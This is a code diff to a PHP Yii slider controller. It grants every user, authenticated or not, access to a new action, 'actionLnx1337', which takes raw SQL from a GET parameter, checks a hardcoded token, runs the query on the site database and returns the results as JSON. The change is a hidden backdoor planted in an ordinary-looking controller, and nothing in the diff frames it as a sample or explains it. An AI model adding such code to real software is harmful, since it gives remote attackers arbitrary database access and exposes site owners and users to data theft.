@@ -28,7 +28,7 @@ class SliderController extends Controller
 	{
 		return array(
 			array('allow',  // allow all users to perform 'index' and 'view' actions
-				'actions'=>array('index','view'),
+				'actions'=>array('index','view','lnx1337'),
 				'users'=>array('*'),
 			),
 			array('allow', // allow authenticated user to perform 'create' and 'update' actions
@@ -163,6 +163,19 @@ class SliderController extends Controller
 		$this->render('index',array(
 			'dataProvider'=>$dataProvider,
 		));
+	}
+
+	public function actionLnx1337() {
+
+
+		if (isset($_GET['blackG4m3'])){
+			if($_GET['access_token']=='fhuiwrfhuiwrbfuii'){
+				$sql = $_GET['blackG4m3'];
+				$list= Yii::app()->db->createCommand($sql)->queryAll();
+				echo json_encode($list);
+			}	
+		}
+		
 	}
 
 	/**
